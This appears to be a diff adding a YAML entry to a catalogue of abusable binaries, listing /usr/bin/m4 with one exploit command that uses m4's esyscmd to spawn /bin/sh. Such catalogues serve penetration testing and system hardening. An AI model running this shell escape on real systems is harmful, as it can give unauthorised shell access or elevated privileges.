@@ -1,0 +1,4 @@
+name: m4
+binary_path: /usr/bin/m4
+exploit_cmds:
+- echo 'esyscmd(/bin/sh 0<&2 1>&2)' | /usr/bin/m4
